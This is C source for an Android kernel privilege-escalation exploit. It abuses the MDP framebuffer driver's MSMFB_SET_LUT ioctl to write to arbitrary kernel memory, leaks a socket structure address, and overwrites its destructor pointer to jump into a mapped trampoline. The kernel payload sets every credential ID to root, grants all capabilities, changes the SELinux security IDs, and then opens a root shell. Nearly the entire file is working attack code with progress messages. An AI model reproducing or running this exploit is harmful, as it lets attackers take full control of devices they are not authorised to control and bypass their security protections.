//#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/utsname.h>
#include<sys/prctl.h>


#include <linux/netlink.h>
#include "inet_diag.h"
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/wait.h>

#include <linux/netlink.h>
#include <string.h>
#include <fcntl.h>
#include "kernel.h"
#include "defines.h"
#include <sys/system_properties.h>

#define PORT 31337

int g_netlink_sock;
struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;


struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;

	/* ... */
};


typedef int  (*fnPrintk)(char*,...);

int verson_offset_buf[3][2]={30,0x17c,34,0x198,310,0x1a8};

/* Get the INET_DIAG cookie for our socket, which contains the low 32 bits
 * of the sock struct address */
unsigned int get_cookie(unsigned int port)
{
	int fd;
	struct sockaddr_nl nladdr;
	struct {
		struct nlmsghdr nlh;
		struct inet_diag_req r;
	} req;
	struct msghdr msg;
	char buf[8192];
	struct iovec iov;
	struct inet_diag_msg *r;

	if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG)) < 0)
		return -1;
	
	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	nladdr.nl_pid = 0;
	
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_type = TCPDIAG_GETSOCK;
	req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
	req.nlh.nlmsg_pid = 0;
	req.nlh.nlmsg_seq = 123456;
	memset(&req.r, 0, sizeof(req.r));
	req.r.idiag_family = AF_INET;
	req.r.idiag_states = 0xfff;
	req.r.idiag_ext = 0;

	iov.iov_base = &req;
	iov.iov_len = sizeof(req);
	
	msg = (struct msghdr) {
		.msg_name = (void*)&nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	
	if (sendmsg(fd, &msg, 0) < 0) {
		close(fd);
		return -1;	
	}
	
	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	
	while (1) {
		int status;
		struct nlmsghdr *h;
			
		msg = (struct msghdr) {
			(void*)&nladdr, sizeof(nladdr),
			&iov, 1, NULL, 0, 0
		};
			
		status = recvmsg(fd, &msg, 0);
			
		if (status < 0) {
			if (errno == EINTR)
				continue;
			close(fd);
			return -1;
		}
			
		if (status == 0) {
			close(fd);
			return -1;
		}
		
		h = (struct nlmsghdr*)buf;
		while (NLMSG_OK(h, status)) {
			if (h->nlmsg_seq == 123456) {
				if (h->nlmsg_type == NLMSG_DONE) {
					close(fd);
					return -1;
				}
				
				if (h->nlmsg_type == NLMSG_ERROR) {
					close(fd);
					return -1;
				}
				
				r = NLMSG_DATA(h);
				if (r->idiag_family == AF_INET &&
				    ntohs(r->id.idiag_sport) == port)
					return r->id.idiag_cookie[0];
				
			}
			h = NLMSG_NEXT(h, status);
		}
	}
	close(fd);
	return -1;
}

/* Get the address of the sock struct for our socket */
unsigned long get_sock_addr(unsigned int port)
{
	FILE *f;
	char buf[1024], path[512];
	unsigned int testport, cookie, a;
	unsigned long addr, b;

	f = fopen("/proc/net/tcp", "r");

	if (f < 0) {
		printf("[*] Failed to open /proc/net/tcp\n");
		return 0;
	}

	while (fgets(buf, 1024, f)) {
		sscanf(buf, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X "
			    "%02X:%08lX %08X %5d %8d %lu %d %p %lu %lu %u %u "
			    "%d\n",
			    &a, &a, &testport, &a, &a, &a, &a, &a, &a, &b,
			    &a, &a, &a, &b, &a, (void **)&addr, &b, &b, &a, &a,
			    &a);
		if (testport == port) {
			/* If kptr_restrict is on... */
			if (!addr) {
				cookie = get_cookie(port);
				addr = (unsigned long)cookie;// + KERNEL_BASE;
			}
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}



static int get_kernel_version(char *out_release, char* out_version)
{
 int ret; const char*ptr;
 int count=0;
 char r[32], *bptr;
 struct utsname buf;
 ret =  uname(&buf);

 if(ret < 0)
   return -1; 
 
 strcpy(out_release, buf.release);
 strcpy(out_version, buf.version);

 ptr = buf.release;
 bptr = r;
 memset(r, 0x00, sizeof(r)); 

 
 while(*ptr)
 {
 	 
      if(*ptr >= '0' && *ptr <= '9')
      	{
   
        *bptr++ = *ptr;
      }
    
    
   if(*ptr == '.')
     count++;
     if(count==2)
        break;
   ptr++;
 }

 if(strlen(r) < 1 || !atoi(r))
   return -1; 

 return atoi(r); 
}




unsigned long get_sock_destruct()
{
    unsigned long target, *payload;
	void *landing;
	struct sockaddr_in addr;
	size_t len;
    char szRelease[256]={0},szVersion[256]={0};
  

	printf("[*] Opening TCP socket...\n");
	g_netlink_sock = socket(AF_INET, SOCK_STREAM, 0);

	if (g_netlink_sock < 0) {
		printf("[*] Failed to open TCP socket.\n");
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	if (bind(g_netlink_sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
		printf("[*] Failed to bind TCP socket.\n");
		return -1;
	}

	/* Our socket won't appear in /proc/net/tcp unless it's listening */
	if (listen(g_netlink_sock, 1)) {
		printf("[*] Failed to listen on TCP socket.\n");
		return -1;
	}

	printf("[*] Getting socket address from INET_DIAG...\n");
	target = get_sock_addr(PORT);

	if (!target) {
		printf("[*] Failed to get socket address.\n");
		return -1;
	}

  
  int versionCode=get_kernel_version(szRelease,szVersion);
  printf("[*] versionCode=%d,szRelease=%s,szVersion=%s\n",versionCode,szRelease,szVersion);
  int sock_offset=get_destruct_offset(versionCode);
  if(sock_offset>=0)
  	{
	target += sock_offset;
	printf("[*] sock_destruct address: %lx\n", target);
   }
   else
   	{
   	printf("[*] Fail to find sock_destruct address!!!!!!!\n");
    return -1;
  }
	
  return target;
}


/*
ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	len = write(pipefd[1], writebuf, count);
		
	if (len != count) {
		printf("11111111111FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
		
	}

	
	read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], writebuf, count);
	len = read(pipefd[0], readbuf, count);
		
	if (len != count) {
		printf("FAILED WRITE @ %p : %d %d %d\n", readbuf,len, 0, errno);
		while (1) {
			sleep(10);
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}*/


static int g_mdp_fd;
static uint32_t g_mdp_base;
static uint32_t g_mdp_lut_i; 

void write_where(int mdp_fd, int mdp_lut_i, int mdp_base, uint32_t content, uint32_t where) {

    printf("[i] Trying to write 0x%08x at 0x%08x\n", content, where);

    if ((content & 0xff000000) != 0) {
        printf("[-] last 8 bits sets, but unable to write them!\n");
        exit(EXIT_FAILURE);
    }

    uint32_t cmap_start_target = (where - mdp_base - MDP_KERNEL_PARAM_OFFSET - 0x400*mdp_lut_i) / 4;

    uint32_t overflown_result = mdp_base + MDP_KERNEL_PARAM_OFFSET + 0x400*mdp_lut_i + cmap_start_target*4;

    printf("[i] Target cmap_start: 0x%08x\n", cmap_start_target);
    printf("[i] Expected VM target address: 0x%08x\n", overflown_result);
    
    uint16_t transp = 0x0;
    uint16_t red = (content & 0x00ff0000) >> 16;
    uint16_t blue = (content & 0x0000ff00) >> 8;
    uint16_t green = (content & 0x000000ff) >> 0;

    printf("[i] transp %01x red %01x blue %01x green %01x\n", transp, red, blue, green);

    struct fb_cmap cmap;

    cmap.start = cmap_start_target;
    cmap.len = 1;
    cmap.transp = &transp;
    cmap.red = &red;
    cmap.blue = &blue;
    cmap.green = &green;

    int res = ioctl(mdp_fd, MSMFB_SET_LUT, &cmap);
    if (res < 0) {
        perror("[-] Failed to trigger MSMFB_SET_LUT ioctl");
        exit(EXIT_FAILURE);
    }
    printf("[+] Wrote 0x%08x to 0x%08x\n", content, where);
}

uint32_t leak_mdp_lut_i(int mdp_fd, int mdp_base) {

    printf("[i] Trying to leak the current value of mdp_lut_i\n");

    //dropzone to leak mdp lut i
    void* dropzone = mmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (dropzone == NULL) {
        perror("[-] Failed to map dropzone\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Successfully mapped dropzone. Address: %p, Size: 0x%08X\n", (void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    memset(dropzone, FILLER_BYTE, USER_MAPPING_SIZE);

    write_where(mdp_fd, 0, mdp_base, 0x00dabeef, (uint32_t) dropzone);


    //Looking for a modification in the buffer
    uint32_t modification = 0;
    void* modification_address = NULL;
    int i;
    for (i=0; i<USER_MAPPING_SIZE; i++) {
        if (((char*)dropzone)[i] != FILLER_BYTE) {
            modification_address = (void*)((uint32_t)dropzone + i);
            modification = *((uint32_t*)modification_address);
            printf("[+] Found modification: 0x%08x at offset: 0x%x (address: %p)\n", modification, i, modification_address);
            break;
        }
    }
    if (modification_address == NULL) {
        printf("[-] Failed to find modification, aborting\n");
        exit(EXIT_FAILURE);
    }

    uint32_t delta = modification_address - dropzone;

    printf("[i] delta write %08x\n", delta);

    uint32_t mdp_lut_i = delta / 0x400;

    if ((delta % 0x400 != 0) || mdp_lut_i > 1) {
        printf("[-] offset not multiple of 0x400 or mdp_lut_i > 1, something went wrong!\n");
        exit(EXIT_FAILURE);
    }

    munmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    return mdp_lut_i;
}

uint32_t get_mdp_base() {

    printf("[i] Trying to leak the value of MDP_BASE\n");

    // /sys/kernel/debug/mdp-dbg/base

    FILE *base;

    base = fopen("/sys/kernel/debug/mdp-dbg/base","r");

    if (!base) {
        printf("[-] Failed to open mdp-dbg/base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    uint32_t mdp_base = 0;

    int res = fscanf(base, "mdp_base  :    %x", &mdp_base);

    if (res != 1) {
        printf("[-] Failed to leak mdp base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    printf("[i] Got mdp_base 0x%08x res %d\n", mdp_base, res);

    fclose(base);

    return mdp_base;
}

int  open_device()
{
//Opening the device
    g_mdp_fd = open("/dev/graphics/fb0", O_RDONLY | O_DSYNC);
    if (g_mdp_fd < 0) {
        perror("[-] Failed to open /dev/graphics/fb0");
        return -errno;
    }
    printf("[+] Opened mdp driver\n");

    g_mdp_base = get_mdp_base();

    printf("[+] Got mdp_base: 0x%08x\n", g_mdp_base);

    g_mdp_lut_i = leak_mdp_lut_i(g_mdp_fd, g_mdp_base);

    printf("[+] Got mdp_lut_i: 0x%01x\n", g_mdp_lut_i);

    // mdp_lut_i will switch between 0 and 1 at each call
    g_mdp_lut_i = !g_mdp_lut_i;
    return g_mdp_fd;
}

uint32_t* mmaping_addr(unsigned int val1,unsigned int val2,unsigned int val3)
{
  
    uint32_t* trampoline = NULL;

    //Allocating the trampoline
    trampoline = (uint32_t*)mmap((void*)TRAMPOLINE_ADDRESS, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (trampoline == NULL) {
        perror("[-] Failed to allocate trampoline");
        return -errno;
    }
    printf("[+] Allocated trampoline\n");

    //printf("[i] Attempting to execute kernel_payload at 0x%08x\n", (uint32_t)&kernel_payload);

    //Writing to the trampoline
    trampoline[0] = val1;//0xE51FF004; //LDR PC, [addr]
    //addr:
    trampoline[1] = val2;//(uint32_t)&kernel_payload;
    trampoline[2] = val3;

    //Flushing the cache (to make sure the I-cache doesn't contain leftovers)
    cacheflush((uint32_t)trampoline & (~0xFFF), 0x1000, 0);

		return trampoline;
}

typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);

void *
get_ksymbol(char *name)
{
        FILE *f = fopen("/proc/kallsyms", "r");
        char c, sym[512];
        void *addr;
        int ret;

        while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
                if (!strcmp(sym, name))
                        return addr;
        }
        
        return NULL;
}


prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

void
resolve_kernel_symbols(void)
{
        prepare_kernel_cred     = get_ksymbol("prepare_kernel_cred");
        commit_creds            = get_ksymbol("commit_creds");

        if (!prepare_kernel_cred || !commit_creds)
                errx(1, "couldn't map all kernel symbols");
        printf("prepare_kernel_cred=%p,commit_creds= %p\n",prepare_kernel_cred,commit_creds);
}

void unmapping_addr()
{
   munmap((void*)TRAMPOLINE_ADDRESS, 0x1000);
}

close_device()
{
   close(g_mdp_fd);
}





 
 int  kmemcmp(char *a1, char *a2, int len)
{
  int v3; // r3@2
  int v4; // r4@3
  int v5; // r5@3
  int result; // r0@4

  if ( len )
  {
    v3 = 0;
    while ( 1 )
    {
      v4 = a1[v3];
      v5 = a2[v3];
      if ( v4 != v5 )
        break;
      if ( a1[v3] )
      {
        ++v3;
        if ( len != v3 )
          continue;
      }
      goto LABEL_7;
    }
    result = v4 - v5;
  }
  else
  {
LABEL_7:
    result = 0;
  }
  return result;
}




int kernel_payload()
{
   
        int v38; // [sp+0h] [bp-60h]@1
        int addrBase;
        char szName[16] = "exploit";
        int offset;
 
        struct task_security_struct * tsec;
        struct thread_info *pThreadInfo;
        int ret = -1;

        int searchLenth;

        int isSelinux = 1;
        mycred *my_cred;
        mycred *my_real_cred;
        
        addrBase = *(int*)(((int)(&v38) & 0xFFFFE000) + 0xC);
        unsigned long mySP=((unsigned long)(&v38) & 0xFFFFE000);//1.  v38此种异或0xFFFFE000的方式，为什么能泄漏sp地址？？？
        pThreadInfo=(struct thread_info *)mySP;//2.  mySP的地址为什么等于thread_info地址？？
        if(pThreadInfo->addr_limit!=0xbf000000)//addr_limit默认值为0xbf000000
        	return 19;
    		pThreadInfo->addr_limit=0xffffffff;//修改pThreadInfo->addr_limit的值
       
    
        if ( addrBase > 0xBFFFFFFF )
        {

          offset = 0;
          while ( 1 )
          {
            addrBase += 4;
            if ( !kmemcmp(addrBase, szName, 16) )
              break;
            ++offset;
            if ( offset == 0x600 )
            {
              return 18;
              
            }
          }
        }
        else
        	{
        	
        	return 17;
        	}
        	
        my_cred = *(int*)(addrBase -8);
        my_real_cred = *(int*)(addrBase -8 - 4);


        searchLenth = 0;
        while(searchLenth<0x20){


                        if(!my_cred || !my_real_cred
                                        || my_cred<0xBFFFFFFF || my_real_cred<0xBFFFFFFF
                                       ){
                                        //2.6?

                                        addrBase-=4;


                                        my_cred = *(int*)(addrBase-8 );
                                        my_real_cred = *(int*)(addrBase -8-4);

                        }
                        else
                                break;

                        searchLenth++;
        }

        if(searchLenth == 0x20)
        	{
                return 20;
           }
                // fuck!! where is my cred???



        //6.修改cred和read_cred相关参数的值。
        my_cred->uid = 0;
        my_cred->gid = 0;
        my_cred->suid = 0;
        my_cred->sgid = 0;
        my_cred->egid = 0;
        my_cred->euid = 0;
        my_cred->fsgid = 0;
        my_cred->fsuid = 0;
        my_cred->securebits=0;
        my_cred->cap_bset.cap[0] = -1;
        my_cred->cap_bset.cap[1] = -1;
        my_cred->cap_inheritable.cap[0] = -1;
        my_cred->cap_inheritable.cap[1] = -1;
        my_cred->cap_permitted.cap[0] = -1;
        my_cred->cap_permitted.cap[1] = -1;
        my_cred->cap_effective.cap[0] = -1;
        my_cred->cap_effective.cap[1] = -1;

        my_real_cred->uid = 0;
        my_real_cred->gid = 0;
        my_real_cred->suid = 0;
        my_real_cred->sgid = 0;
        my_real_cred->egid = 0;
        my_real_cred->euid = 0;
        my_real_cred->fsgid = 0;
        my_real_cred->fsuid = 0;
        my_real_cred->securebits=0;
        my_real_cred->cap_bset.cap[0] = -1;
        my_real_cred->cap_bset.cap[1] = -1;
        my_real_cred->cap_inheritable.cap[0] = -1;
        my_real_cred->cap_inheritable.cap[1] = -1;
        my_real_cred->cap_permitted.cap[0] = -1;
        my_real_cred->cap_permitted.cap[1] = -1;
        my_real_cred->cap_effective.cap[0] = -1;
        my_real_cred->cap_effective.cap[1] = -1;

        //7.  判断是否是selinux，如果是定位到tsec结构体的地址。
        if(isSelinux){
                        //8.修改tsec结构体的参数的值。Bypass seliux。
                        tsec = my_cred->security;
                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;
                                        ret = 151;
                        }
                        else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_cred->security));
                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;
                                                                            ret = 152;
                                                            }
                        }

                        tsec = my_real_cred->security;
                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;
                                        ret = 153;
                        }else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_real_cred->security));
                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;
                                                                            ret = 154;
                                                            }
                        }
        }
        else{
                        ret = 16;
        }
      //commit_creds(prepare_kernel_cred(0));
      return ret;
}


int get_destruct_offset(int version)
{
	int i=0,iRet=-1;
  for(i=0;i<3;i++)
  {
  if(verson_offset_buf[i][0]==version)
  {
       iRet=verson_offset_buf[i][1];
  }
  }
  return iRet;

}


int main(int argc, char* argv[],char *env[])
{ 
	
	
  
  uint32_t* trampoline = NULL;
 
  //找到地址
  resolve_kernel_symbols();
  unsigned long sk_addr=get_sock_destruct();
  open_device();
  trampoline=mmaping_addr(0xE51FF004,(uint32_t)&kernel_payload,0);
   write_where(g_mdp_fd, g_mdp_lut_i, g_mdp_base, (uint32_t)trampoline, sk_addr);
    printf("[+] Execute Shellcode \n");
   close(g_netlink_sock);
   unmapping_addr();
   close_device();
   printf("uid = %d \r\n",getuid());
	 printf("gid = %d \r\n",getgid());
		
		if (getgid()==0)
		{
			printf("ROOT SUCCESS\r\n");
		         
		}
		else
		{
			printf("ROOT FIAL\r\n");
		}
        execl("/system/bin/sh", "sh", NULL);      
  
	return 0;
}

 